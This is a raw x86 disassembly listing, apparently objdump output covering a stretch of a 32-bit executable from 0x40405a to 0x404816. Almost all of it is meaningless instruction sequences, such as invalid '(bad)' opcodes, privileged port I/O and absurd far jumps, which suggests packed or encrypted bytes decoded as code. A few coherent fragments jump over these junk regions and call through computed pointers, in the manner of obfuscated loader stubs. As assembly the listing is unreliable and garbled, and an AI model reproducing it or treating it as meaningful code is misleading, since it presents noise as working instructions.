  40405a:	or     bl,BYTE PTR [ebp+ebx*8+0x2102e5cc]
  404061:	les    ebp,FWORD PTR [edi-0x31]
  404064:	mov    al,ds:0x258102f0
  404069:	(bad)  
  40406a:	(bad)  
  40406c:	lods   al,BYTE PTR ds:[esi]
  40406d:	leave  
  40406e:	iret   
  40406f:	outs   dx,DWORD PTR ds:[esi]
  404070:	inc    edx
  404071:	(bad)
  404074:	pop    esi
  404075:	mov    esi,0x9f975623
  40407a:	adc    BYTE PTR [edx-0x6e],ah
  40407d:	jp     0x40407d
  40407f:	inc    ebp
  404080:	in     eax,0xe7
  404082:	lea    edi,[esi]
  404084:	nop
  404085:	push   ecx
  404086:	sbb    eax,0x98fe92a8
  40408b:	push   0xc46fb6c1
  404090:	loopne 0x404036
  404092:	loope  0x4040f1
  404094:	push   esi
  404095:	push   edi
  404096:	call   0x537f31d1
  40409b:	rcr    BYTE PTR [ebp-0x15e3dc72],0x51
  4040a2:	shl    cl,cl
  4040a4:	arpl   WORD PTR [ecx+0x3b],sp
  4040a7:	shr    dl,0xcc
  4040aa:	pop    esi
  4040ab:	idiv   DWORD PTR [eax]
  4040ad:	nop
  4040ae:	test   BYTE PTR [edx],0x52
  4040b1:	or     al,0x79
  4040b3:	stos   BYTE PTR es:[edi],al
  4040b4:	dec    ebx
  4040b5:	cwde   
  4040b6:	int    0x2d
  4040b8:	mov    ds:0x9745e1eb,eax
  4040bd:	retf   
  4040be:	add    dh,BYTE PTR [ecx]
  4040c0:	fidivr DWORD PTR ds:[ebp+edx*8-0x41]
  4040c5:	retf   0x5186
  4040c8:	push   ecx
  4040c9:	dec    edi
  4040ca:	xchg   ebx,eax
  4040cb:	fimul  WORD PTR [edi]
  4040cd:	repz add ch,BYTE PTR [edi+0xd]
  4040d1:	or     eax,0xd73bdad6
  4040d6:	dec    ebp
  4040d7:	lods   eax,DWORD PTR ds:[esi]
  4040d8:	adc    DWORD PTR [edi+0x21f6c30b],ecx
  4040de:	dec    esi
  4040df:	mov    bh,0xbd
  4040e1:	and    BYTE PTR [esi],dl
  4040e3:	out    0xa0,eax
  4040e5:	cmp    edi,DWORD PTR [eax-0x48e1be53]
  4040eb:	xchg   ebp,eax
  4040ec:	bnd jmp 0x404079
  4040ef:	inc    edx
  4040f0:	add    BYTE PTR [esi+eax*1+0x1857d748],ah
  4040f7:	xchg   esi,eax
  4040f8:	push   es
  4040f9:	repz sub al,0xb8
  4040fc:	mov    esi,0x1902ca18
  404101:	(bad)  
  404102:	not    BYTE PTR [edx]
  404104:	stos   DWORD PTR es:[edi],eax
  404105:	ins    DWORD PTR es:[edi],dx
  404106:	or     BYTE PTR [esi+ebp*4-0x64],dl
  40410a:	cmc    
  40410b:	xlat   BYTE PTR ds:[ebx]
  40410c:	sahf   
  40410d:	pop    edi
  40410e:	xchg   ebx,eax
  40410f:	enter  0xfdb8,0x77
  404113:	in     al,0xbd
  404115:	sbb    ch,bh
  404117:	xor    BYTE PTR [edx-0x13153e3a],0x70
  40411e:	nop
  40411f:	inc    esi
  404120:	popf   
  404121:	or     eax,0x3d6fbd3
  404126:	in     eax,0x7d
  404128:	add    BYTE PTR [edi],dh
  40412a:	mov    ecx,0x2a0caaaa
  40412f:	adc    bl,BYTE PTR [edi]
  404131:	shr    bh,0xe7
  404134:	aam    0x71
  404136:	jae    0x40416a
  404138:	shr    ecx,1
  40413a:	xor    ah,0x78
  40413d:	test   al,0x70
  40413f:	sub    al,0x7b
  404141:	push   es
  404142:	lods   al,BYTE PTR ds:[esi]
  404143:	pushf  
  404144:	ins    DWORD PTR es:[edi],dx
  404145:	xchg   edi,eax
  404146:	xchg   esp,eax
  404147:	cdq    
  404148:	iret   
  404149:	daa    
  40414a:	adc    DWORD PTR [edi+0x9a0e2f1],edx
  404150:	in     eax,dx
  404151:	cmc    
  404152:	sbb    DWORD PTR [esi+0x4f5af895],0x69f1fd7b
  40415c:	xor    al,0xd0
  40415e:	in     al,0x5e
  404160:	jbe    0x404168
  404162:	sbb    eax,0xf1e73795
  404167:	pop    es
  404168:	pop    esp
  404169:	aad    0x3
  40416b:	fcom   QWORD PTR [ecx+0x1f94f422]
  404171:	mov    BYTE PTR [eax],cl
  404173:	push   eax
  404174:	in     al,0x5a
  404176:	in     eax,dx
  404177:	mov    edi,0xb512bb35
  40417c:	pop    esi
  40417d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40417e:	xor    esi,DWORD PTR [ebp+0x88993c7]
  404184:	frstor [esi+0x3d]
  404187:	jno    0x404161
  404189:	xchg   BYTE PTR [esi+0x7cf2d812],cl
  40418f:	adc    al,0xa7
  404191:	enter  0xe5a9,0xfe
  404195:	stos   DWORD PTR es:[edi],eax
  404196:	mov    cl,0xda
  404198:	mov    esp,0xf533408b
  40419e:	xor    cl,BYTE PTR [eax-0x131d3d8d]
  4041a4:	xlat   BYTE PTR ds:[ebx]
  4041a5:	mov    al,ds:0x76fbc0f
  4041aa:	ins    DWORD PTR es:[edi],dx
  4041ab:	pavgb  mm1,mm4
  4041ae:	(bad)  
  4041b0:	ins    DWORD PTR es:[edi],dx
  4041b1:	jecxz  0x404188
  4041b3:	leave  
  4041b4:	out    dx,eax
  4041b5:	stos   DWORD PTR es:[edi],eax
  4041b6:	rcr    BYTE PTR [edi],cl
  4041b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041b9:	out    0xf,al
  4041bb:	pop    esp
  4041bc:	js     0x404198
  4041be:	pop    esp
  4041bf:	pop    edi
  4041c0:	xor    ebp,DWORD PTR [ebx+eax*2+0xb037ee6]
  4041c7:	jge    0x404182
  4041c9:	and    esi,DWORD PTR [ebp-0x2c]
  4041cc:	das    
  4041cd:	and    esp,DWORD PTR [ebx]
  4041cf:	and    al,0x3
  4041d1:	inc    ebp
  4041d2:	xchg   edx,eax
  4041d3:	xchg   BYTE PTR [ebp-0xaffbb8e],al
  4041d9:	test   DWORD PTR [ebx],eax
  4041db:	cdq    
  4041dc:	jb     0x404186
  4041de:	shl    DWORD PTR [ebx-0x5d1b866c],0x6
  4041e5:	xchg   DWORD PTR [edi-0x561f27c3],ebp
  4041eb:	in     eax,0xc8
  4041ed:	push   eax
  4041ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ef:	dec    ecx
  4041f0:	ret    0xe393
  4041f3:	mov    BYTE PTR [esi+0x7c],ah
  4041f6:	pop    ecx
  4041f7:	mul    DWORD PTR [ecx]
  4041f9:	add    eax,0x8f48ae23
  4041fe:	cmp    ecx,DWORD PTR [eax+ebx*8]
  404201:	adc    DWORD PTR [ebp-0x1a],0x1
  404205:	jae    0x404213
  404207:	stos   DWORD PTR es:[edi],eax
  404208:	outs   dx,DWORD PTR ds:[esi]
  404209:	ds jecxz 0x40427c
  40420c:	inc    eax
  40420d:	jl     0x4041bf
  40420f:	xchg   ecx,edx
  404211:	dec    BYTE PTR [edx]
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si+0x21],0x2b
  404248:	call   0x6f7e:0x7e25d5cf
  40424f:	jge    0x4042cf
  404251:	jle    0x404247
  404253:	inc    ecx
  404254:	dec    esp
  404255:	xchg   ecx,eax
  404256:	in     eax,dx
  404257:	xor    DWORD PTR [ebx+0x5e],0x32ebec16
  40425e:	js     0x404278
  404260:	pop    esi
  404261:	out    0x73,eax
  404263:	loop   0x404226
  404265:	fwait
  404266:	lods   eax,DWORD PTR ds:[esi]
  404267:	pop    es
  404268:	dec    BYTE PTR [eax-0x80]
  40426b:	xlat   BYTE PTR ds:[ebx]
  40426c:	xor    esi,DWORD PTR [ebp-0x56]
  40426f:	pop    edx
  404270:	jecxz  0x4042f1
  404272:	add    al,0xb9
  404274:	pop    ss
  404275:	mov    ecx,0x77581f17
  40427a:	xor    cl,dl
  40427c:	jmp    0xb4b5787c
  404281:	lds    edi,FWORD PTR [esi+ebx*2]
  404284:	inc    ebp
  404285:	mov    ebp,edi
  404287:	ret    0xd094
  40428a:	popf   
  40428b:	ja     0x404286
  40428d:	mov    dh,0x23
  40428f:	sbb    DWORD PTR [eax],edx
  404291:	pop    es
  404292:	(bad)
  404296:	jno    0x4042ee
  404298:	adc    dh,BYTE PTR [edi+0x75]
  40429b:	pop    ecx
  40429c:	arpl   bx,cx
  40429e:	push   ebp
  40429f:	xor    esi,DWORD PTR [eax-0x3edc5611]
  4042a5:	cmp    al,0x9c
  4042a7:	or     DWORD PTR [eax+0x329c76fa],0x94dea73e
  4042b1:	je     0x4042db
  4042b3:	mov    WORD PTR [ebx-0x53],ds
  4042b6:	pop    ebp
  4042b7:	inc    eax
  4042b8:	and    BYTE PTR [eax-0x36e9ef12],ch
  4042be:	jmp    0x3200b1d5
  4042c3:	adc    BYTE PTR [ecx],ah
  4042c5:	lds    edi,FWORD PTR [ebx+eax*4-0x13]
  4042c9:	ins    BYTE PTR es:[edi],dx
  4042ca:	push   cs
  4042cb:	out    0x5d,eax
  4042cd:	adc    esi,ebp
  4042cf:	push   eax
  4042d0:	mov    ds:0x3ce974bc,al
  4042d5:	mov    dl,BYTE PTR [eax-0x24]
  4042d8:	ja     0x4042c3
  4042da:	xor    ebp,esp
  4042dc:	(bad)
  4042df:	(bad)
  4042e2:	push   ebx
  4042e3:	pop    es
  4042e4:	fldcw  WORD PTR [ecx+0x1f]
  4042e7:	stc    
  4042e8:	iret   
  4042e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042ea:	ins    BYTE PTR es:[edi],dx
  4042eb:	aad    0xea
  4042ed:	push   ecx
  4042ee:	aam    0x72
  4042f0:	mov    al,ds:0x115b7d27
  4042f5:	sbb    al,0x4b
  4042f7:	jmp    0x5cb7:0xd9a11ba2
  4042fe:	(bad)  
  404300:	hlt    
  404301:	rcl    edx,1
  404303:	out    dx,al
  404304:	add    DWORD PTR [eax],esp
  404306:	lds    esi,FWORD PTR [eax]
  404308:	push   ebp
  404309:	das    
  40430a:	sub    al,0x61
  40430c:	into   
  40430d:	dec    ecx
  40430e:	cld    
  40430f:	nop
  404310:	add    eax,0x2d9ac6f7
  404315:	(bad)  
  404316:	push   es
  404317:	sub    al,0x11
  404319:	int    0x83
  40431b:	xchg   esi,eax
  40431c:	lock mov cl,0xbb
  40431f:	mov    dh,0xb
  404321:	sar    esi,cl
  404323:	pop    ss
  404324:	clc    
  404325:	or     al,0xca
  404327:	dec    edi
  404328:	cmp    al,0x35
  40432a:	xchg   edx,eax
  40432b:	aam    0x13
  40432d:	add    edx,ebp
  40432f:	or     DWORD PTR [eax-0x54],eax
  404332:	inc    ecx
  404333:	(bad)  
  404335:	pushf  
  404336:	out    0xc8,al
  404338:	push   eax
  404339:	sbb    eax,0xcfc5b8cc
  40433e:	dec    edi
  40433f:	sbb    DWORD PTR [ebp+0x42130185],ebp
  404345:	scas   al,BYTE PTR es:[edi]
  404346:	into   
  404347:	scas   al,BYTE PTR es:[edi]
  404348:	sbb    ebp,ecx
  40434a:	push   esp
  40434b:	sbb    edi,DWORD PTR [edx+0x2e9cb15f]
  404351:	xchg   ebx,eax
  404352:	pop    eax
  404353:	mov    ds:0x8c9e7bff,al
  404358:	repz sub DWORD PTR [edx+0x54],0xffffffbe
  40435d:	mov    ds:0x28b70d3b,eax
  404362:	stos   BYTE PTR es:[edi],al
  404363:	in     eax,0x9b
  404365:	mov    dh,0xca
  404367:	pop    ds
  404368:	mov    ecx,cs
  40436a:	fdivr  st,st(1)
  40436c:	ret    
  40436d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40436e:	shl    BYTE PTR [edi],0x37
  404371:	punpcklwd mm2,DWORD PTR [edx-0x67]
  404375:	push   cs
  404376:	sti    
  404377:	push   ebp
  404378:	inc    edi
  404379:	mov    cl,0xc1
  40437b:	add    dh,0x37
  40437e:	push   ebx
  40437f:	cli    
  404380:	inc    esi
  404381:	cmp    al,0x85
  404383:	nop
  404384:	mov    bh,BYTE PTR [ebx-0x6a]
  404387:	aam    0x3
  404389:	add    al,BYTE PTR [eax-0x50bc5bbf]
  40438f:	in     al,dx
  404390:	sbb    eax,0x9e07c4db
  404395:	cld    
  404396:	sbb    esi,eax
  404398:	out    dx,al
  404399:	sbb    al,dl
  40439b:	sti    
  40439c:	jp     0x404323
  40439e:	js     0x4043bf
  4043a0:	pop    ss
  4043a1:	aam    0x78
  4043a3:	add    dl,BYTE PTR [eax+0x3d1626fc]
  4043a9:	pop    ds
  4043aa:	mov    edx,0x8ba7ab82
  4043af:	fmul   st(6),st
  4043b1:	mov    al,ds:0x22998d13
  4043b6:	inc    esp
  4043b7:	inc    esp
  4043b8:	hlt    
  4043b9:	add    eax,0xc8768cd9
  4043be:	adc    ebp,DWORD PTR [edx]
  4043c0:	(bad)  
  4043c2:	dec    ebx
  4043c3:	add    dl,BYTE PTR [ebp-0x46]
  4043c6:	inc    ebp
  4043c7:	pop    eax
  4043c8:	pop    ebx
  4043c9:	mov    dl,0xd2
  4043cb:	push   ebp
  4043cc:	arpl   WORD PTR [edx-0x70],sp
  4043cf:	xchg   ebp,eax
  4043d0:	lahf   
  4043d1:	mov    cl,0x56
  4043d3:	and    dl,BYTE PTR [esi-0x6e]
  4043d6:	sbb    bl,bl
  4043d8:	pop    ebp
  4043d9:	adc    bh,al
  4043db:	jp     0x4043ce
  4043dd:	jge    0x40440b
  4043df:	ja     0x404368
  4043e1:	or     eax,0xe3fb38f7
  4043e6:	aas    
  4043e7:	inc    edx
  4043e8:	or     ebx,esi
  4043ea:	xchg   esi,eax
  4043eb:	add    BYTE PTR [edx+0x4388c5c8],bh
  4043f1:	xor    BYTE PTR [eax+0x5c4a40e7],dh
  4043f7:	sub    ebp,esp
  4043f9:	xchg   esi,eax
  4043fa:	mov    edx,0x4237d667
  4043ff:	sbb    eax,0xe8ab7daf
  404404:	or     dl,BYTE PTR [eax+0x8f1e60a]
  40440a:	add    al,BYTE PTR [edi+0x6161fd0]
  404410:	cdq    
  404411:	cmp    edx,DWORD PTR [ebx]
  404413:	cld    
  404414:	cmp    cl,BYTE PTR ds:0xc8549854
  40441a:	xchg   ebx,eax
  40441b:	enter  0x6ee1,0x6e
  40441f:	push   esi
  404420:	pop    edi
  404421:	sub    bh,BYTE PTR [eax+eiz*1]
  404424:	pop    ebx
  404425:	adc    BYTE PTR [esi-0x63],bl
  404428:	out    dx,eax
  404429:	xor    dl,bh
  40442b:	jbe    0x40445a
  40442d:	popf   
  40442e:	mov    bl,0xf0
  404430:	leave  
  404431:	repz cmp BYTE PTR [edx+0x63],bl
  404435:	leave  
  404436:	mov    eax,0x2de0a92e
  40443b:	jae    0x404419
  40443d:	mov    ebx,0x563bc349
  404442:	mov    esi,0x4f340480
  404447:	sbb    al,0x26
  404449:	out    0x10,eax
  40444b:	cmc    
  40444c:	ffreep st(7)
  40444e:	add    DWORD PTR es:[edi+0x20],0xbf522093
  404456:	rcl    BYTE PTR [edx],1
  404458:	jl     0x404467
  40445a:	mov    bh,0x39
  40445c:	jae    0x40449e
  40445e:	jbe    0x40449c
  404460:	leave  
  404461:	or     edi,esp
  404463:	fdiv   DWORD PTR [esi+0x2e]
  404466:	into   
  404467:	popa   
  404468:	mov    eax,ds:0xda9747c1
  40446d:	xchg   ecx,eax
  40446e:	lods   al,BYTE PTR ds:[esi]
  40446f:	xor    al,0x61
  404471:	mov    ebx,0x91f826b4
  404476:	jmp    0xd670f920
  40447b:	in     al,0xd6
  40447d:	out    0xbe,eax
  40447f:	mov    bh,0x53
  404481:	rcr    BYTE PTR [edx],cl
  404483:	xchg   ebp,eax
  404484:	sbb    eax,0x723a96fa
  404489:	dec    ah
  40448b:	sub    edx,ecx
  40448d:	push   esp
  40448e:	(bad)  
  40448f:	pop    esi
  404490:	and    edx,DWORD PTR [ebx]
  404492:	leave  
  404493:	mov    ds:0x1a2126e6,eax
  404498:	nop
  404499:	sbb    DWORD PTR [ecx-0x38b7741c],ebp
  40449f:	rcr    BYTE PTR [esi+0x55],1
  4044a2:	inc    eax
  4044a3:	(bad)  
  4044a4:	cmp    DWORD PTR [ecx+0x23],edx
  4044a7:	ror    BYTE PTR [eax*4-0x20e1e438],cl
  4044ae:	jns    0x40446b
  4044b0:	aaa    
  4044b1:	lahf   
  4044b2:	nop
  4044b3:	(bad)  
  4044b4:	in     al,dx
  4044b5:	loopne 0x4044b5
  4044b7:	into   
  4044b8:	loop   0x40450b
  4044ba:	(bad)  
  4044bb:	test   eax,0x8a6117f
  4044c0:	ret    0x2fc6
  4044c3:	dec    esi
  4044c4:	dec    ecx
  4044c5:	(bad)  
  4044c6:	sub    eax,0xb37f12a6
  4044cb:	in     eax,0x7e
  4044cd:	jbe    0x404478
  4044cf:	aas    
  4044d0:	in     al,0x17
  4044d2:	add    dl,0xe9
  4044d5:	nop
  4044d6:	data16 loope 0x40447f
  4044d9:	call   0x6fff:0xd5137e8c
  4044e0:	aas    
  4044e1:	das    
  4044e2:	mov    eax,0x3fb18612
  4044e7:	je     0x40450b
  4044e9:	fisttp DWORD PTR [ebp-0x3dc1496d]
  4044ef:	pop    ebx
  4044f0:	lahf   
  4044f1:	ret    0x8963
  4044f4:	dec    esp
  4044f5:	sbb    al,0x6a
  4044f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044f8:	and    eax,DWORD PTR [edi]
  4044fa:	sbb    eax,DWORD PTR [ebp*2-0x4e8c9785]
  404501:	mov    ch,0xdd
  404503:	jg     0x404547
  404505:	out    dx,eax
  404506:	fisttp WORD PTR [edi-0x613ab1b9]
  40450c:	and    edi,DWORD PTR [eax]
  40450e:	xor    cl,bh
  404510:	mov    bh,0x38
  404512:	sar    DWORD PTR [esi],0xc8
  404515:	push   ss
  404516:	jnp    0x40453a
  404518:	pop    ds
  404519:	and    BYTE PTR ds:0xd280d2f5,0x63
  404520:	mov    al,BYTE PTR [eax+0xa2539ec]
  404526:	ins    DWORD PTR es:[edi],dx
  404527:	loope  0x404568
  404529:	mov    ecx,0x76257fc0
  40452e:	push   ecx
  40452f:	(bad)  
  404530:	lock xchg BYTE PTR [edx-0x5f51109a],al
  404537:	das    
  404538:	xchg   ebx,eax
  404539:	add    cl,dl
  40453b:	add    esp,esp
  40453d:	and    esi,DWORD PTR [edx]
  40453f:	sub    ebx,DWORD PTR [ecx-0x47]
  404542:	xor    ebp,0x55
  404545:	fsub   DWORD PTR [ecx]
  404547:	dec    ebp
  404548:	subps  xmm5,XMMWORD PTR [eax-0x44]
  40454c:	jno    0x4044d0
  40454e:	scas   eax,DWORD PTR es:[edi]
  40454f:	js     0x404566
  404551:	push   ss
  404552:	cwde   
  404553:	jmp    0xb9a0:0x8aaf0138
  40455a:	mov    edi,0x7caf22dc
  40455f:	inc    edi
  404560:	and    al,0xdb
  404562:	inc    ecx
  404563:	xchg   edi,eax
  404564:	enter  0xa759,0xb5
  404568:	push   edi
  404569:	inc    ebx
  40456a:	mov    BYTE PTR [ebx+0x8],ah
  40456d:	je     0x4044f7
  40456f:	mov    WORD PTR [edx+0x55],fs
  404572:	ss stc 
  404574:	or     eax,0x8c25088c
  404579:	mov    BYTE PTR [ebp+0x4673d654],cl
  40457f:	cs dec ebx
  404581:	adc    BYTE PTR [edi],cl
  404583:	add    DWORD PTR [edi],edi
  404585:	bound  eax,QWORD PTR [eax+ebx*2-0x790feac3]
  40458c:	popf   
  40458d:	sbb    BYTE PTR [edi],ah
  40458f:	(bad)  
  404590:	fild   DWORD PTR [edi+0x371802ab]
  404596:	mov    edi,0xed1941e4
  40459b:	sbb    BYTE PTR [edx+ebx*1+0x6320e727],al
  4045a2:	cmp    al,0x5
  4045a4:	out    0xb2,al
  4045a6:	mov    ds:0xe9f0fb59,eax
  4045ab:	mov    fs,WORD PTR [ecx]
  4045ad:	aad    0x92
  4045af:	mul    bh
  4045b1:	aam    0xfa
  4045b3:	jecxz  0x404603
  4045b5:	test   DWORD PTR [ebp+esi*1+0x70],edi
  4045b9:	addr16 cmp eax,0x537b0f2c
  4045bf:	xor    cl,ch
  4045c1:	xor    DWORD PTR [ebp-0x5548817],esp
  4045c7:	dec    edi
  4045c8:	adc    DWORD PTR [ebp+ecx*8+0x2ed1ec45],ecx
  4045cf:	fsub   DWORD PTR [edx+0x6a2331fb]
  4045d5:	rcr    DWORD PTR [eax],0x7b
  4045d8:	cmp    al,0xcc
  4045da:	dec    esi
  4045db:	sti    
  4045dc:	dec    edi
  4045dd:	xor    edi,DWORD PTR [esi+0x27a850c2]
  4045e3:	xor    al,0x0
  4045e5:	jo     0x40456c
  4045e7:	adc    esi,DWORD PTR [edi-0x13]
  4045ea:	adc    al,0x28
  4045ec:	gs gs cs inc ebp
  4045f0:	push   edi
  4045f1:	jnp    0x40459d
  4045f3:	adc    edx,ebp
  4045f5:	adc    DWORD PTR [ecx-0x6c],eax
  4045f8:	outs   dx,BYTE PTR ds:[esi]
  4045f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045fa:	mov    esi,0x6b3648a
  4045ff:	dec    esp
  404600:	out    0x29,al
  404602:	std    
  404603:	adc    BYTE PTR [ebx+0x2b337264],cl
  404609:	outs   dx,DWORD PTR ds:[esi]
  40460a:	loopne 0x40459c
  40460c:	xor    ah,cl
  40460e:	mov    al,0xac
  404610:	dec    ebp
  404611:	sub    al,0xc7
  404613:	push   cs
  404614:	pusha  
  404615:	daa    
  404616:	or     al,0x79
  404618:	repnz jecxz 0x4045a4
  40461b:	push   ecx
  40461c:	loope  0x40460f
  40461e:	mov    BYTE PTR [edx+0x71],dh
  404621:	cli    
  404622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404623:	adc    DWORD PTR [ebx+esi*4+0x40],0x8ebb305a
  40462b:	in     eax,dx
  40462c:	jns    0x404668
  40462e:	inc    ecx
  40462f:	ds retf 0x61df
  404633:	xchg   ebp,eax
  404634:	cwde   
  404635:	aad    0x94
  404637:	outs   dx,BYTE PTR ds:[esi]
  404638:	pop    ss
  404639:	push   ecx
  40463a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40463b:	scas   al,BYTE PTR es:[edi]
  40463c:	and    eax,0xe67d7755
  404641:	jp     0x4045f0
  404643:	push   DWORD PTR [eax]
  404645:	lea    eax,ds:0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0xafb28fe3
  404675:	fld    st(2)
  404677:	and    DWORD PTR [esi+0x7e],edi
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	jge    0x4046fb
  40467d:	jle    0x4046b7
  40467f:	cmc    
  404680:	fdiv   DWORD PTR [ebx+0x621a71a9]
  404686:	cld    
  404687:	jo     0x4046ff
  404689:	lock pop edx
  40468b:	in     eax,0x87
  40468d:	ins    BYTE PTR es:[edi],dx
  40468e:	add    DWORD PTR [ebx+0x29a73fbb],esp
  404694:	mov    bl,0x2c
  404696:	les    ecx,FWORD PTR [esi+0x2a]
  404699:	jmp    0xa57d:0xfe0f63a9
  4046a0:	mov    ch,0x94
  4046a2:	push   ss
  4046a3:	cmp    DWORD PTR [eax-0x7e],esp
  4046a6:	(bad)  
  4046a8:	jecxz  0x404704
  4046aa:	fimul  DWORD PTR [ebp+0x59f611c4]
  4046b0:	push   es
  4046b1:	push   edx
  4046b2:	push   ds
  4046b3:	and    DWORD PTR [edi+0x5b],esp
  4046b6:	mov    ds:0x3602759,eax
  4046bb:	fbstp  TBYTE PTR [edi+0x68]
  4046be:	ret    
  4046bf:	in     al,0x69
  4046c1:	sbb    BYTE PTR [ebp-0x7aa4a34e],0xb9
  4046c8:	lods   al,BYTE PTR ds:[esi]
  4046c9:	pop    esp
  4046ca:	xlat   BYTE PTR ds:[ebx]
  4046cb:	mov    esi,0xcdb43844
  4046d0:	stos   BYTE PTR es:[edi],al
  4046d1:	mov    cl,0x36
  4046d3:	aas    
  4046d4:	add    BYTE PTR [edx+0x29],dh
  4046d7:	mov    esp,0x4722d28b
  4046dc:	fbstp  TBYTE PTR [ebx+eiz*2-0xe3f1011]
  4046e3:	loope  0x40470c
  4046e5:	sub    ch,bh
  4046e7:	fcomip st,st(5)
  4046e9:	adc    al,0x7d
  4046eb:	test   eax,0xd888e865
  4046f0:	inc    esi
  4046f1:	int3   
  4046f2:	mov    cl,ch
  4046f4:	xchg   edx,eax
  4046f5:	mov    ds:0x2b5c1442,eax
  4046fa:	aaa    
  4046fb:	ja     0x404779
  4046fd:	sub    al,0x88
  4046ff:	cld    
  404700:	gs loopne 0x4046c2
  404703:	mov    bl,0x11
  404705:	inc    ebp
  404706:	in     eax,dx
  404707:	(bad)  
  40470a:	jae    0x40473f
  40470c:	mov    esp,0xb82f78e6
  404711:	loop   0x404763
  404713:	rol    DWORD PTR [eax],1
  404715:	xor    al,0x7
  404717:	popa   
  404718:	pop    esi
  404719:	mov    esi,0xe4885fa
  40471e:	test   BYTE PTR [ebx],dh
  404720:	cld    
  404721:	iret   
  404722:	outs   dx,BYTE PTR ds:[esi]
  404723:	mov    WORD PTR [edi],ds
  404725:	add    ebp,DWORD PTR [ecx+esi*8+0x73]
  404729:	push   ss
  40472a:	fstp   DWORD PTR [ecx]
  40472c:	inc    ebp
  40472d:	aad    0xcf
  40472f:	mov    ch,0xdf
  404731:	inc    ebx
  404732:	(bad)  
  404733:	fcomp  st(1)
  404735:	stos   BYTE PTR es:[edi],al
  404736:	jmp    FWORD PTR [edi+0x604023d6]
  40473c:	pushf  
  40473d:	sub    eax,0xad3d7444
  404742:	xor    al,0x80
  404744:	xchg   edx,eax
  404745:	sbb    ebp,edi
  404747:	aaa    
  404748:	mov    al,ds:0x65ecf004
  40474d:	rep lods eax,DWORD PTR ds:[esi]
  40474f:	outs   dx,DWORD PTR ds:[esi]
  404750:	sub    BYTE PTR [esi-0x6d],al
  404753:	or     edi,ebx
  404755:	jge    0x4047b3
  404757:	pushf  
  404758:	adc    BYTE PTR [ebx-0x786d20b9],ch
  40475e:	enter  0x508f,0x34
  404762:	cld    
  404763:	iret   
  404764:	inc    ecx
  404765:	in     al,dx
  404766:	add    eax,0x8e4db9f2
  40476b:	xor    dl,bl
  40476d:	cwde   
  40476e:	mov    dl,0x59
  404770:	sub    esp,ecx
  404772:	js     0x404786
  404774:	cmp    ah,ah
  404776:	cmp    al,0xcb
  404778:	lods   eax,DWORD PTR ds:[esi]
  404779:	mov    bl,0x50
  40477b:	aas    
  40477c:	sbb    DWORD PTR [ebx+0x1570a3e6],edx
  404782:	rcl    DWORD PTR [esi],cl
  404784:	adc    ebx,DWORD PTR [ebx+0x3326258e]
  40478a:	mov    edx,0xfddf7525
  40478f:	pop    esp
  404791:	aam    0x8f
  404793:	jg     0x4047a4
  404795:	ins    DWORD PTR es:[edi],dx
  404796:	inc    esp
  404797:	dec    edi
  404798:	cdq    
  404799:	cwde   
  40479a:	sub    eax,0x3fae6813
  40479f:	out    0xe5,al
  4047a1:	mov    al,BYTE PTR [esi]
  4047a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047a4:	lods   al,BYTE PTR ds:[esi]
  4047a5:	mov    esi,0xf578fcd
  4047aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047ab:	push   cs
  4047ac:	xor    eax,0xd2cf85e4
  4047b1:	cmp    DWORD PTR [edi*2+0x6eae3f53],esp
  4047b8:	sub    al,0x23
  4047ba:	jbe    0x40476b
  4047bc:	xchg   edi,eax
  4047bd:	stos   DWORD PTR es:[edi],eax
  4047be:	mov    eax,ds:0xdd975eb6
  4047c3:	(bad)  
  4047c4:	fimul  DWORD PTR [ebx+edi*1]
  4047c7:	add    DWORD PTR [edx],edi
  4047c9:	adc    ah,dl
  4047cb:	xchg   esi,eax
  4047cc:	pop    ebx
  4047cd:	sbb    BYTE PTR [esi+0x6fa90f83],al
  4047d3:	icebp  
  4047d4:	push   cs
  4047d5:	ins    BYTE PTR es:[edi],dx
  4047d6:	push   es
  4047d7:	pop    eax
  4047d8:	mov    eax,0x93212b6a
  4047dd:	icebp  
  4047de:	inc    esp
  4047df:	les    esp,FWORD PTR [edx-0x2fcea983]
  4047e5:	mov    bh,0x87
  4047e7:	pop    ss
  4047e8:	xor    al,0x72
  4047ea:	sub    al,BYTE PTR [edi+0x7a]
  4047ed:	sbb    eax,0xb0ec01b1
  4047f2:	fistp  WORD PTR [ebx+0x215db870]
  4047f8:	xchg   esp,eax
  4047f9:	mov    eax,0xd46bf4db
  4047fe:	mov    ah,BYTE PTR [esi+0x3ba4d3fd]
  404804:	and    DWORD PTR [ecx+0x9112670],0x9717a67
  40480e:	sub    eax,0x41fc6cf4
  404813:	jle    0x40483f
  404815:	in     al,dx
  404816:	(bad)  
